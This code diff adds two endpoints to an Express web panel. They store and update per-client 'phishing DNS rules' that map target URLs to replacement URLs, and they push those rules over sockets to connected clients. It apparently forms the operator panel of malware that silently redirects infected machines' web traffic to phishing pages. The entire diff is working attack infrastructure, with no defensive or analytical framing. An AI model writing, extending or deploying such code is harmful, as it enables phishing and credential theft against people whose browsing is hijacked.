@@ -171,6 +171,58 @@ module.exports = function initializeWebUiApi(appWebUI, server) {
 
     res.json(statistics);
   });
+  appWebUI.post("/phishingrules", async (req, res) => {
+    const { client_ids } = req.body;
+  
+    try {
+      const rules = db.prepare(`
+        SELECT client_id, target_url, replacement_url 
+        FROM phish_dns_rules 
+        WHERE client_id IN (${client_ids.map(() => "?").join(",")})
+      `).all(client_ids);
+      
+      res.json({ success: true, rules });
+    } catch (error) {
+      console.error("Error getting phishing rules:", error);
+      res.status(500).json({ success: false, error: "Failed to get phishing rules" });
+    }
+  });
+  appWebUI.post("/updatephishingrules", async (req, res) => {
+    const { rules, client_id } = req.body;
+  
+    try {
+      db.transaction(() => {
+        // Delete existing rules for this client
+        db.prepare("DELETE FROM phish_dns_rules WHERE client_id = ?").run(client_id);
+        
+        // Insert new rules
+        const insertStmt = db.prepare(`
+          INSERT INTO phish_dns_rules (client_id, target_url, replacement_url)
+          VALUES (?, ?, ?)
+        `);
+        
+        for (const rule of rules) {
+          insertStmt.run(client_id, rule.target_url, rule.replacement_url);
+        }
+      })();
+      
+      // Notify client about the update
+      const socket = socketMaps[client_id];
+      if (socket) {
+        const clientRules = rules.map(rule => ({
+          id: rule.id,
+          target_url: rule.target_url,
+          replacement_url: rule.replacement_url
+        }));
+        socket.send(JSON.stringify(["phishdns_update", clientRules]));
+      }
+      
+      res.json({ success: true });
+    } catch (error) {
+      console.error("Error updating phishing rules:", error);
+      res.status(500).json({ success: false, error: "Failed to update phishing rules" });
+    }
+  });
   appWebUI.get("/*", (req, res) => {
     res.sendFile(path.join(__dirname, "../webui/dist", "index.html"));
   });
